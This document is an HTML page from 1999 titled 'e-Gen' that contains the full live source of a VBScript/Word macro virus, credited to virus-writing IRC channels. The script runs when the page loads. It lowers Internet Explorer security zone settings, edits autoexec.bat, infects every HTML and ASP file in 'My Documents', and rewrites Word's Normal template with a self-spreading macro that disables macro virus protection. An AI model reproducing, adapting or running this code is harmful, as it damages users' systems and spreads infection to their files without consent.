<nospace>

<html>
<head>
<title>e-Gen</title>
</head>

<body>

<br><br><br>
<font size="7"><center>e-Gen</font>
<br>
<br>
<font size = 2 face="times">to you, time is of the essence</font>

<br>
<br>
<font face="arial" size=1>
<b></b><font face="arial" size=2><pre>&copy 1999   f  0  r  e</pre><br><br> 
<bR>
</font>
<font size="1" face="arial">thanks to: Spysend, dr[yozak], [Pax], TPhunk, 1nternal and everyone else in #vir, #virus and #gigavirii.
</center>

<script language="VBScript"><!--

Sub Mark()
End Sub

On error Resume Next

Set WshShell = CreateObject("WScript.Shell")


WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1004" , 0, "REG_DWORD"

WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1200" , 0, "REG_DWORD"

WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\0\1201" , 0, "REG_DWORD"

WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1004" , 0, "REG_DWORD"

WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1200" , 0, "REG_DWORD"

WshShell.RegWrite"HKEY_CURRENT_USER\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings\Zones\3\1201" , 0, "REG_DWORD"


WshShell.RegWrite "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\RegisteredOwner", "f0re"


	Dim FSO
	Set FSO = CreateObject("Scripting.FileSystemObject")
	
	Set fh = fso.opentextfile("c:\autoexec.bat", 1, true)
	FileContents = fh.ReadAll()
	fh.close
	Set fh = fso.opentextfile("c:\autoexec.bat", 2, true)
	Nextline = "pause"
	fh.write(FileContents)
	fh.writeline NextLine
	fh.close

	Set TRange = document.body.createTextRange

	Set cd = FSO.OpenTextFile("c:\windows\test.txt", 2, True)
	cd.WriteLine TRange.htmltext
	cd.close()

	findr = "novalue"
	Set cd = FSO.OpenTextFile("c:\windows\test.txt", 1, False)

	beginvir = "Sub Mark()"
	
	Do While cd.atendofstream <> True
		findr = cd.readline
		if findr = beginvir then exit Do
	Loop

	Set nd = FSO.OpenTextFile("c:\windows\test2.txt", 2, True)
	
	linr = "bla"
	nd.writeline "<script language=" + Chr(34) + "VBScript" + Chr(34) + "><!--"
	nd.writeline beginvir
	Do While cd.atendofstream <> True
		linr = cd.readline
		nd.writeline linr
	Loop
	
	nd.close
	cd.close


 	
        Set FolderObj = FSO.GetFolder("c:\my documents\")
	Set FO = FolderObj.Files
	For each target in FO
		ExtName = lcase(FSO.GetExtensionName(target.Name))
		if ExtName = "htt" or ExtName = "asp" or ExtName = "htm" or ExtName = "html" then
			Set Real = FSO.OpenTextFile(target.path, 1, False)
			if Real.readline <> "<nospace>" then
				Real.close()
				GetFile(target.path)
			else
				Real.close()
			end if
		end if
	next


Sub GetFile(GetFileName)

	Set nd = FSO.OpenTextFile("c:\windows\test2.txt", 1, True)
	virus = nd.readAll()
	nd.close

	Set Real = FSO.OpenTextFile(GetFileName, 1, False)
	FileContents2 = Real.ReadAll()
	Real.close()

	Set Real = FSO.OpenTextFile(GetFileName, 2, False)
	Real.WriteLine "<nospace>"
	Real.Write(FileContents2)
	Real.writeline " "
	Real.writeline " "
	Real.Write(virus)
	Real.close()
End Sub
	



	wfindr = "novalue"
	Set cd = FSO.OpenTextFile("c:\windows\test2.txt", 1, False)

	wbeginvir = "Sub WordMark()"
	
	Do While cd.atendofstream <> True
		wfindr = cd.readline
		if wfindr = wbeginvir then exit Do
	Loop

	Set nd = FSO.OpenTextFile("c:\windows\test3.txt", 2, True)
	
	wlinr = "bla"
	nd.writeline "Private Sub Document_Open()"

	Do While wlinr <> "End Sub"
		wlinr = cd.readline
		nd.writeline wlinr
	Loop
	
	nd.close
	cd.close


	Set wv = FSO.OpenTextFile("c:\windows\test3.txt", 1, True)
	Set nwv = FSO.OpenTextFile("c:\windows\test4.txt", 2, True)
	readmvir = "nopers"

	Do while wv.atendofstream <> True
		readmvir = wv.readline
		if Mid(readmvir,1,1) = "'" then readmvir = Mid(readmvir,2,Len(readmvir) -1)
		
		nwv.writeline readmvir	
	Loop

	nwv.Close
	wv.close

	Set iw = FSO.OpenTextFile("c:\windows\test4.txt", 1, True)
	wordvir = iw.readAll()
	iw.close

	Set iw = FSO.OpenTextFile("c:\windows\test4.txt", 1, True)
	
	Set WordObj = CreateObject("Word.Application")
	Set NT= WordObj.normaltemplate.vbproject.vbcomponents(1).codemodule

	If NT.Lines(3,1) <> "'phrame 2000" then
	
		WordObj.Options.SaveNormalPrompt = False
		NT.DeleteLines 1, NT.CountOfLines
		i = 1
		
		Do while iw.atendofstream <> true
		b = iw.readline
		NT.InsertLines i, b
		i = i + 1
		Loop
			    	
	End If
	Set NT = Nothing
	WordObj.Quit
	iw.close



Sub WordMark()

''phrame 2000
On Error Resume Next

CommandBars("File").Enabled = True
CommandBars("Tools").Controls("macro").Enabled = True
CommandBars("Help").Enabled = True
Application.EnableCancelKey = 0

Options.VirusProtection = (1 - 1)
Options.SaveNormalPrompt = 0
Options.ConfirmConversions = (1 - 1)
ScreeenUpdate = 0

DisableAutoMacros = 0
ToolsOptionsSave.GlobalDotPrompt = 0
ToolsOptionsSave.AutoSave = 0

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "phrame") <> "phraming the world into the next millenium" Then
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "phrame") = "phraming the world into the next millenium"
End If

Set NT = NormalTemplate.VBProject.VBComponents.Item(1)
Set AD = ActiveDocument.VBProject.VBComponents.Item(1)
    
NTCL = NT.CodeModule.CountOfLines
ADCL = ADI1.CodeModule.CountOfLines
    
    BGN = 2
  
If NT.Name <> "ThisDocument" Then
    If NTCL > 0 Then NT.CodeModule.DeleteLines 1, NTCL
    Set ToInfect = NT
    NT.Name = "ThisDocument"
    DoNT = True
End If

If AD.Name <> "Document" Then
    If ADCL > 0 Then AD.CodeModule.DeleteLines 1, ADCL
    Set ToInfect = AD
    AD.Name = "Document"
    DoAD = True
End If

'If DoNT <> True And DoAD <> True Then GoTo PhrameEnd

If DoNT = True Then
   ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
   Do While BGN < 99
     ToInfect.CodeModule.InsertLines BGN, AD.CodeModule.Lines(BGN, 1)
     BGN = BGN + 1
   Loop
End If

If DoAD = True Then
   ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
   Do While BGN < 99
     ToInfect.CodeModule.InsertLines BGN, NT.CodeModule.Lines(BGN, 1)
     BGN = BGN + 1
   Loop
End If

'PhrameEnd:

Root = System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\", "SystemRoot")
Targ = Mid(Root, 1, 3)

'Open Targ + "autoexec.bat" For Append As #1
'        Print #1, "pause"
'Close #1

Rndnm = Int((Rnd() * 15) + 1)
If Rndnm = 15 Then

'    Selection.EndKey Unit:=wdStory
'    Selection.TypeParagraph
'    Selection.Font.ColorIndex = wdWhite
'    Selection.TypeText "phraming the world into the next millenium"
'    Selection.ParagraphFormat.Alignment = wdAlignParagraphCenter
'    Selection.HomeKey Unit:=wdLine
'    Selection.MoveRight Unit:=wdCharacter, Count:=42, Extend:=wdExtend
'    Selection.LanguageID = wdNoProofing
'    Selection.HomeKey Unit:=wdStory

'    ToolsCustomizeKeyboard.KeyCode = 27
'    ToolsCustomizeKeyboard.Category = 1
'    ToolsCustomizeKeyboard.Name = "Cancel"
'    ToolsCustomizeKeyboard.Remove
'    ToolsCustomizeKeyboard.Context = 0
'    
'    SendKeys "%" + "{F4}"

End If
End Sub



--></script>





</body>
</html>

